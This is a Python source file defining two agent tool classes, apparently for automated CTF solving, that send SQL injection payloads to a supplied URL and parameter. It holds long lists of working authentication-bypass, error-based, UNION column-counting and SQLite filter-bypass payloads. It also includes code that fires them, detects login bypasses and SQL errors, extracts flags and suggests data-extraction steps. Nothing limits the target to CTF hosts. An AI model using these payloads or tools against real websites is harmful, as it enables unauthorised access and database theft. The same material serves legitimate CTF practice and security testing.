"""
SQL Injection testing tools for CTF solving.

Provides automated SQL injection payload testing and column counting for UNION attacks.
"""

import json
import re
import time
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin

import requests


class SqliProbeTool:
    """
    SqliProbeTool: Test SQL injection vulnerabilities with various payload sets.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "url": "http://target.com/login",
          "method": "POST",                    # GET or POST
          "param": "username",                 # Parameter to inject into
          "payload_set": "auth_bypass",        # auth_bypass, error_based, union_detect, or custom
          "custom_payloads": ["'", "\""],      # Only if payload_set is "custom"
          "data": {"password": "test"},        # Other form data to include
          "headers": {},                       # Optional headers
          "timeout": 10                        # Optional timeout per request
        }

    Payload sets:
      - auth_bypass: Common authentication bypass payloads
      - error_based: Payloads designed to trigger SQL error messages
      - union_detect: Payloads to detect UNION injection points
      - custom: User-provided payloads via custom_payloads
    """

    name: str = "sqli_probe"
    description: str = (
        "Test SQL injection vulnerabilities by sending various payloads to a target parameter. "
        "Input must be JSON with keys: 'url' (target URL), 'method' ('GET' or 'POST'), "
        "'param' (parameter name to inject into), 'payload_set' (one of 'auth_bypass', "
        "'error_based', 'union_detect', 'sqlite_bypass', or 'custom'), optional "
        "'custom_payloads' (list of payloads if using custom set), optional 'data' "
        "(other form data to include), optional 'headers', optional 'timeout' (default 10). "
        "Returns analysis of which payloads triggered SQL errors, authentication bypasses, "
        "or other interesting responses."
    )

    # Authentication bypass payloads - designed to return true or bypass login
    AUTH_BYPASS_PAYLOADS: List[str] = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR 1=1 --",
        "' OR 1=1 #",
        "admin' --",
        "admin' #",
        "' OR 'x'='x",
        "' OR ''='",
        "1' OR '1'='1",
        "' OR 1=1/*",
        "') OR ('1'='1",
        "') OR ('1'='1' --",
        "admin'/*",
        "' OR 1=1 LIMIT 1 --",
        "' OR 1=1 LIMIT 1 #",
        "1' OR '1'='1' /*",
        "' UNION SELECT 1 --",
        "' OR 'a'='a",
        "'-'",
        "' '",
        "'&'",
        "'^'",
        "'*'",
        "' OR ''-'",
        "' OR '' '",
        "' OR ''&'",
        "' OR ''^'",
        "' OR ''*'",
        "or true--",
        "' OR 'unusual'='unusual",
    ]

    # Error-based payloads - designed to trigger SQL error messages
    ERROR_BASED_PAYLOADS: List[str] = [
        "'",
        "\"",
        "''",
        "\"\"",
        "'\"",
        "' AND '1'='2",
        "' AND 1=CONVERT(int, 'a') --",
        "' AND 1=1 AND '1'='1",
        "1'",
        "1\"",
        "\\",
        "' OR '",
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION())) --",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
        "' AND 1=CAST((SELECT @@version) AS int) --",
        "' UNION SELECT NULL --",
        "' UNION SELECT NULL, NULL --",
        "' ORDER BY 1 --",
        "' ORDER BY 100 --",
        "1 AND 1=1",
        "1 AND 1=2",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "; SELECT 1 --",
        "'; SELECT 1 --",
        "1; SELECT 1 --",
        "' HAVING 1=1 --",
        "' GROUP BY 1 --",
    ]

    # UNION detection payloads - designed to find column counts
    UNION_DETECT_PAYLOADS: List[str] = [
        "' UNION SELECT NULL --",
        "' UNION SELECT NULL, NULL --",
        "' UNION SELECT NULL, NULL, NULL --",
        "' UNION SELECT NULL, NULL, NULL, NULL --",
        "' UNION SELECT NULL, NULL, NULL, NULL, NULL --",
        "' UNION SELECT 1 --",
        "' UNION SELECT 1, 2 --",
        "' UNION SELECT 1, 2, 3 --",
        "' UNION SELECT 1, 2, 3, 4 --",
        "' UNION SELECT 1, 2, 3, 4, 5 --",
        "' UNION ALL SELECT NULL --",
        "' UNION ALL SELECT NULL, NULL --",
        "' UNION ALL SELECT NULL, NULL, NULL --",
        "' ORDER BY 1 --",
        "' ORDER BY 2 --",
        "' ORDER BY 3 --",
        "' ORDER BY 4 --",
        "' ORDER BY 5 --",
        "' ORDER BY 10 --",
        "' ORDER BY 20 --",
        "' ORDER BY 50 --",
        "') UNION SELECT NULL --",
        "') UNION SELECT NULL, NULL --",
        "\") UNION SELECT NULL --",
        "\") UNION SELECT NULL, NULL --",
    ]

    # SQLite filter bypass payloads - designed for filtered environments
    SQLITE_BYPASS_PAYLOADS: List[str] = [
        # Concatenation-based admin bypass
        "ad'||'min",
        "ad'||'min'||'",
        "ad'||'min' || '",
        "a'||'dmin",
        "adm'||'in",
        # IS operator (equality without =)
        "' IS NOT NULL --",
        "admin' AND 1 IS 1 --",
        "' IS NOT NULL OR '1' IS '1",
        # GLOB operator (matching without = or LIKE)
        "' GLOB '*' --",
        "admin' AND username GLOB 'admin",
        "' OR username GLOB '*' --",
        # BETWEEN operator (equality via range)
        "' OR username BETWEEN 'admin' AND 'admin' --",
        "' OR id BETWEEN 1 AND 1 --",
        # No-comment payloads (when -- and /* are blocked)
        "ad'||'min'||'",
        "' || '1' || '",
        "admin' || '",
        # Double-pipe boolean (when OR is blocked)
        "' || 1 || '",
        "' || '1",
        # Mixed bypass (multiple filters)
        "ad'||'min' AND 1 IS 1 || '",
        "' IS NOT NULL || '",
    ]

    # SQL error patterns to detect
    SQL_ERROR_PATTERNS: List[Tuple[str, str]] = [
        (r"SQL syntax.*MySQL", "MySQL syntax error"),
        (r"Warning.*mysql_", "MySQL warning"),
        (r"MySqlClient\.", "MySQL .NET error"),
        (r"PostgreSQL.*ERROR", "PostgreSQL error"),
        (r"Warning.*pg_", "PostgreSQL warning"),
        (r"valid PostgreSQL result", "PostgreSQL error"),
        (r"Npgsql\.", "PostgreSQL .NET error"),
        (r"Driver.*SQL[\-\_\ ]*Server", "MSSQL error"),
        (r"Microsoft.*SQL.*Server", "MSSQL error"),
        (r"OLE DB.*SQL Server", "MSSQL OLE error"),
        (r"\bSQLServer\b", "MSSQL error"),
        (r"SQLServer JDBC Driver", "MSSQL JDBC error"),
        (r"Microsoft SQL Native Client error", "MSSQL Native error"),
        (r"\[SQL Server\]", "MSSQL error"),
        (r"ODBC SQL Server Driver", "MSSQL ODBC error"),
        (r"SQLite/JDBCDriver", "SQLite JDBC error"),
        (r"SQLite\.Exception", "SQLite .NET error"),
        (r"System\.Data\.SQLite", "SQLite .NET error"),
        (r"Warning.*sqlite_", "SQLite warning"),
        (r"SQLite error", "SQLite error"),
        (r"\[SQLITE_ERROR\]", "SQLite error"),
        (r"ORA-\d{5}", "Oracle error"),
        (r"Oracle error", "Oracle error"),
        (r"Oracle.*Driver", "Oracle driver error"),
        (r"Warning.*oci_", "Oracle warning"),
        (r"Warning.*ora_", "Oracle warning"),
        (r"SQL command not properly ended", "Oracle error"),
        (r"quoted string not properly terminated", "Oracle error"),
        (r"CLI Driver.*DB2", "DB2 error"),
        (r"DB2 SQL error", "DB2 error"),
        (r"Sybase message", "Sybase error"),
        (r"Unclosed quotation mark", "SQL Server/Sybase error"),
        (r"You have an error in your SQL syntax", "MySQL syntax error"),
        (r"syntax error at or near", "PostgreSQL syntax error"),
        (r"Incorrect syntax near", "MSSQL syntax error"),
        (r"SQLSTATE\[", "Generic SQL error"),
        (r"near \".*\": syntax error", "SQLite syntax error"),
    ]

    # Success indicators for auth bypass
    SUCCESS_INDICATORS: List[str] = [
        "welcome",
        "dashboard",
        "logged in",
        "login successful",
        "admin",
        "profile",
        "logout",
        "sign out",
        "my account",
        "settings",
        "flag",
        "ctf{",
        "picoctf{",
        "htb{",
        "thm{",
    ]

    # Failure indicators
    FAILURE_INDICATORS: List[str] = [
        "invalid",
        "incorrect",
        "failed",
        "error",
        "wrong",
        "denied",
        "unauthorized",
        "bad password",
        "bad username",
        "login failed",
        "authentication failed",
    ]

    def __init__(self, session: Optional[requests.Session] = None) -> None:
        self.session = session or requests.Session()

    def _get_payloads(self, payload_set: str, custom_payloads: Optional[List[str]] = None) -> List[str]:
        """Get payloads for the specified set."""
        if payload_set == "auth_bypass":
            return self.AUTH_BYPASS_PAYLOADS
        elif payload_set == "error_based":
            return self.ERROR_BASED_PAYLOADS
        elif payload_set == "union_detect":
            return self.UNION_DETECT_PAYLOADS
        elif payload_set == "sqlite_bypass":
            return self.SQLITE_BYPASS_PAYLOADS
        elif payload_set == "custom":
            return custom_payloads or []
        else:
            return []

    def _detect_sql_errors(self, response_text: str) -> List[str]:
        """Detect SQL error patterns in response."""
        errors_found = []
        for pattern, error_type in self.SQL_ERROR_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                errors_found.append(error_type)
        return list(set(errors_found))  # Remove duplicates

    def _detect_success(self, response_text: str) -> List[str]:
        """Detect success indicators in response."""
        found = []
        text_lower = response_text.lower()
        for indicator in self.SUCCESS_INDICATORS:
            if indicator.lower() in text_lower:
                found.append(indicator)
        return found

    def _detect_failure(self, response_text: str) -> List[str]:
        """Detect failure indicators in response."""
        found = []
        text_lower = response_text.lower()
        for indicator in self.FAILURE_INDICATORS:
            if indicator.lower() in text_lower:
                found.append(indicator)
        return found

    def _extract_flag(self, response_text: str) -> Optional[str]:
        """Try to extract a CTF flag from response."""
        # Common flag patterns - order matters, more specific patterns first
        patterns = [
            r"(picoCTF\{[^}]+\})",
            r"(picoctf\{[^}]+\})",
            r"(HTB\{[^}]+\})",
            r"(htb\{[^}]+\})",
            r"(THM\{[^}]+\})",
            r"(thm\{[^}]+\})",
            r"(FLAG\{[^}]+\})",
            r"(flag\{[^}]+\})",
            r"(CTF\{[^}]+\})",
            r"(ctf\{[^}]+\})",
        ]
        for pattern in patterns:
            match = re.search(pattern, response_text)
            if match:
                return match.group(1)
        return None

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[SqliProbeTool] Error: Invalid JSON input. {exc}"

        # Validate required fields
        url = data.get("url")
        if not url or not isinstance(url, str):
            return "[SqliProbeTool] Error: 'url' (string) is required."

        method = (data.get("method") or "GET").upper()
        if method not in ("GET", "POST"):
            return "[SqliProbeTool] Error: 'method' must be 'GET' or 'POST'."

        param = data.get("param")
        if not param or not isinstance(param, str):
            return "[SqliProbeTool] Error: 'param' (string) is required - the parameter to inject into."

        payload_set = data.get("payload_set", "auth_bypass")
        if payload_set not in ("auth_bypass", "error_based", "union_detect", "sqlite_bypass", "custom"):
            return "[SqliProbeTool] Error: 'payload_set' must be one of: auth_bypass, error_based, union_detect, sqlite_bypass, custom."

        custom_payloads = data.get("custom_payloads")
        if payload_set == "custom" and not custom_payloads:
            return "[SqliProbeTool] Error: 'custom_payloads' list required when using 'custom' payload_set."

        form_data = data.get("data") or {}
        headers = data.get("headers") or {}
        timeout = data.get("timeout", 10)

        # Get payloads
        payloads = self._get_payloads(payload_set, custom_payloads)
        if not payloads:
            return "[SqliProbeTool] Error: No payloads available for the specified payload_set."

        # First, get a baseline response (without injection)
        baseline_data = {**form_data, param: "test_baseline_value"}
        try:
            if method == "GET":
                baseline_resp = self.session.get(url, params=baseline_data, headers=headers, timeout=timeout)
            else:
                baseline_resp = self.session.post(url, data=baseline_data, headers=headers, timeout=timeout)
            baseline_length = len(baseline_resp.text)
            baseline_status = baseline_resp.status_code
        except Exception as exc:
            return f"[SqliProbeTool] Error getting baseline response: {exc}"

        # Test each payload
        results = []
        interesting_payloads = []
        errors_detected = {}
        successes_detected = {}
        flags_found = []

        for payload in payloads:
            test_data = {**form_data, param: payload}
            try:
                if method == "GET":
                    resp = self.session.get(url, params=test_data, headers=headers, timeout=timeout)
                else:
                    resp = self.session.post(url, data=test_data, headers=headers, timeout=timeout)

                resp_text = resp.text
                resp_length = len(resp_text)
                resp_status = resp.status_code

                # Analyze response
                sql_errors = self._detect_sql_errors(resp_text)
                success_indicators = self._detect_success(resp_text)
                failure_indicators = self._detect_failure(resp_text)
                flag = self._extract_flag(resp_text)

                # Determine if this is interesting
                is_interesting = False
                reason = []

                # SQL errors found
                if sql_errors:
                    is_interesting = True
                    reason.append(f"SQL errors: {', '.join(sql_errors)}")
                    errors_detected[payload] = sql_errors

                # Success indicators without failure indicators
                if success_indicators and not failure_indicators:
                    is_interesting = True
                    reason.append(f"Success indicators: {', '.join(success_indicators)}")
                    successes_detected[payload] = success_indicators

                # Significant length difference from baseline
                length_diff = abs(resp_length - baseline_length)
                if length_diff > 100 and resp_length > baseline_length:
                    is_interesting = True
                    reason.append(f"Length diff: +{length_diff} bytes")

                # Status code change
                if resp_status != baseline_status and resp_status == 200:
                    is_interesting = True
                    reason.append(f"Status changed: {baseline_status} -> {resp_status}")

                # Flag found
                if flag:
                    is_interesting = True
                    reason.append(f"FLAG FOUND: {flag}")
                    flags_found.append(flag)

                if is_interesting:
                    interesting_payloads.append({
                        "payload": payload,
                        "status": resp_status,
                        "length": resp_length,
                        "reasons": reason,
                    })

            except requests.exceptions.Timeout:
                # Timeout could indicate time-based blind SQLi
                interesting_payloads.append({
                    "payload": payload,
                    "status": "TIMEOUT",
                    "length": 0,
                    "reasons": ["Request timed out - possible time-based blind SQLi"],
                })
            except Exception as exc:
                # Other errors
                results.append(f"  Error with payload '{payload[:30]}...': {exc}")

        # Build summary
        output_lines = [
            f"[SqliProbeTool] SQL Injection Probe Results",
            f"=" * 50,
            f"Target: {url}",
            f"Method: {method}",
            f"Parameter: {param}",
            f"Payload Set: {payload_set}",
            f"Payloads Tested: {len(payloads)}",
            f"Baseline Status: {baseline_status}",
            f"Baseline Length: {baseline_length} bytes",
            "",
        ]

        # Flags found
        if flags_found:
            output_lines.append("!!! FLAGS FOUND !!!")
            for flag in flags_found:
                output_lines.append(f"  {flag}")
            output_lines.append("")

        # Interesting payloads
        if interesting_payloads:
            output_lines.append(f"INTERESTING PAYLOADS ({len(interesting_payloads)} found):")
            output_lines.append("-" * 40)
            for item in interesting_payloads:
                output_lines.append(f"  Payload: {item['payload']}")
                output_lines.append(f"    Status: {item['status']}, Length: {item['length']}")
                for reason in item["reasons"]:
                    output_lines.append(f"    -> {reason}")
                output_lines.append("")
        else:
            output_lines.append("No obviously interesting payloads found.")
            output_lines.append("Consider trying a different payload set or manual testing.")
            output_lines.append("")

        # Summary
        output_lines.append("SUMMARY:")
        output_lines.append(f"  SQL Errors Triggered: {len(errors_detected)}")
        output_lines.append(f"  Success Bypasses: {len(successes_detected)}")
        output_lines.append(f"  Flags Found: {len(flags_found)}")

        # Recommendations
        output_lines.append("")
        output_lines.append("RECOMMENDATIONS:")
        if errors_detected:
            output_lines.append("  - SQL errors detected! Try error-based extraction techniques.")
            output_lines.append("  - Consider using UNION-based injection for data extraction.")
        if successes_detected:
            output_lines.append("  - Authentication bypass may have succeeded!")
            output_lines.append("  - Check session cookies for admin access.")
        if not errors_detected and not successes_detected:
            output_lines.append("  - No clear vulnerabilities detected with this payload set.")
            output_lines.append("  - Try error_based or union_detect payload sets.")
            output_lines.append("  - Consider blind SQL injection testing with timing analysis.")

        return "\n".join(output_lines)


class SqliColumnCounter:
    """
    SqliColumnCounter: Determine the number of columns for UNION-based SQL injection.

    Uses ORDER BY or UNION SELECT NULL techniques to find the exact column count.

    Expected JSON tool_input format:

        {
          "url": "http://target.com/page?id=1",
          "method": "GET",
          "param": "id",
          "technique": "order_by",     # order_by or union_null
          "prefix": "'",               # SQL prefix before payload
          "suffix": " --",             # SQL suffix after payload
          "max_columns": 20,           # Maximum columns to test
          "data": {},                  # Additional form data
          "headers": {},               # Optional headers
          "timeout": 10                # Optional timeout
        }
    """

    name: str = "sqli_column_counter"
    description: str = (
        "Determine the number of columns for UNION-based SQL injection. "
        "Input must be JSON with keys: 'url' (target URL), 'method' ('GET' or 'POST'), "
        "'param' (parameter to inject), 'technique' ('order_by' or 'union_null'), "
        "optional 'prefix' (SQL prefix, default \"'\"), optional 'suffix' (SQL suffix, "
        "default ' --'), optional 'max_columns' (default 20), optional 'data', "
        "optional 'headers', optional 'timeout'. Returns the detected column count "
        "or range of possible values."
    )

    def __init__(self, session: Optional[requests.Session] = None) -> None:
        self.session = session or requests.Session()

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[SqliColumnCounter] Error: Invalid JSON input. {exc}"

        # Validate required fields
        url = data.get("url")
        if not url or not isinstance(url, str):
            return "[SqliColumnCounter] Error: 'url' (string) is required."

        method = (data.get("method") or "GET").upper()
        if method not in ("GET", "POST"):
            return "[SqliColumnCounter] Error: 'method' must be 'GET' or 'POST'."

        param = data.get("param")
        if not param or not isinstance(param, str):
            return "[SqliColumnCounter] Error: 'param' (string) is required."

        technique = data.get("technique", "order_by")
        if technique not in ("order_by", "union_null"):
            return "[SqliColumnCounter] Error: 'technique' must be 'order_by' or 'union_null'."

        prefix = data.get("prefix", "'")
        suffix = data.get("suffix", " --")
        max_columns = data.get("max_columns", 20)
        form_data = data.get("data") or {}
        headers = data.get("headers") or {}
        timeout = data.get("timeout", 10)

        # Get baseline response for comparison
        baseline_data = {**form_data, param: "1"}
        try:
            if method == "GET":
                baseline_resp = self.session.get(url, params=baseline_data, headers=headers, timeout=timeout)
            else:
                baseline_resp = self.session.post(url, data=baseline_data, headers=headers, timeout=timeout)
            baseline_length = len(baseline_resp.text)
            baseline_status = baseline_resp.status_code
        except Exception as exc:
            return f"[SqliColumnCounter] Error getting baseline: {exc}"

        output_lines = [
            f"[SqliColumnCounter] Column Count Detection",
            f"=" * 50,
            f"Target: {url}",
            f"Parameter: {param}",
            f"Technique: {technique}",
            f"Prefix: {repr(prefix)}",
            f"Suffix: {repr(suffix)}",
            f"Baseline Status: {baseline_status}",
            f"Baseline Length: {baseline_length}",
            "",
        ]

        if technique == "order_by":
            # Binary search with ORDER BY
            output_lines.append("Testing with ORDER BY technique...")
            output_lines.append("-" * 40)

            last_success = 0
            first_failure = max_columns + 1

            for col_num in range(1, max_columns + 1):
                payload = f"{prefix} ORDER BY {col_num}{suffix}"
                test_data = {**form_data, param: payload}

                try:
                    if method == "GET":
                        resp = self.session.get(url, params=test_data, headers=headers, timeout=timeout)
                    else:
                        resp = self.session.post(url, data=test_data, headers=headers, timeout=timeout)

                    # Check for error indicators
                    resp_text = resp.text.lower()
                    has_error = any(err in resp_text for err in [
                        "error", "unknown column", "order by", "invalid",
                        "syntax", "unexpected"
                    ])

                    if has_error or resp.status_code >= 400:
                        first_failure = col_num
                        output_lines.append(f"  ORDER BY {col_num}: FAILED (error detected)")
                        break
                    else:
                        last_success = col_num
                        output_lines.append(f"  ORDER BY {col_num}: OK")

                except Exception as exc:
                    output_lines.append(f"  ORDER BY {col_num}: Error - {exc}")
                    first_failure = col_num
                    break

            if last_success > 0:
                output_lines.append("")
                output_lines.append(f"RESULT: {last_success} columns detected")
                output_lines.append(f"  ORDER BY {last_success} succeeded, ORDER BY {first_failure} failed")
            else:
                output_lines.append("")
                output_lines.append("RESULT: Could not determine column count")
                output_lines.append("  Try adjusting prefix/suffix or using union_null technique")

        else:  # union_null technique
            output_lines.append("Testing with UNION SELECT NULL technique...")
            output_lines.append("-" * 40)

            found_columns = 0

            for col_num in range(1, max_columns + 1):
                nulls = ", ".join(["NULL"] * col_num)
                payload = f"{prefix} UNION SELECT {nulls}{suffix}"
                test_data = {**form_data, param: payload}

                try:
                    if method == "GET":
                        resp = self.session.get(url, params=test_data, headers=headers, timeout=timeout)
                    else:
                        resp = self.session.post(url, data=test_data, headers=headers, timeout=timeout)

                    # Check for successful UNION (no error, similar or larger response)
                    resp_text = resp.text.lower()
                    has_error = any(err in resp_text for err in [
                        "different number of columns",
                        "column.*mismatch",
                        "syntax error",
                        "union.*select",
                    ])

                    if not has_error and resp.status_code < 400:
                        # Check if response is similar to baseline (could indicate success)
                        length_diff = abs(len(resp.text) - baseline_length)
                        if length_diff < baseline_length * 0.5:  # Within 50% of baseline
                            found_columns = col_num
                            output_lines.append(f"  UNION SELECT {nulls}: SUCCESS!")
                            break
                        else:
                            output_lines.append(f"  UNION SELECT {nulls}: OK (length diff: {length_diff})")
                    else:
                        output_lines.append(f"  UNION SELECT ({col_num} NULLs): FAILED")

                except Exception as exc:
                    output_lines.append(f"  UNION SELECT ({col_num} NULLs): Error - {exc}")

            if found_columns > 0:
                output_lines.append("")
                output_lines.append(f"RESULT: {found_columns} columns detected")
                output_lines.append("")
                output_lines.append("NEXT STEPS:")
                output_lines.append(f"  1. Use: ' UNION SELECT {', '.join(['NULL']*found_columns)} --")
                output_lines.append("  2. Replace NULLs with column values to extract data")
                output_lines.append("  3. Try: ' UNION SELECT 1,2,3,... to find visible columns")
            else:
                output_lines.append("")
                output_lines.append("RESULT: Could not determine column count")
                output_lines.append("  Try adjusting prefix/suffix or different technique")

        return "\n".join(output_lines)
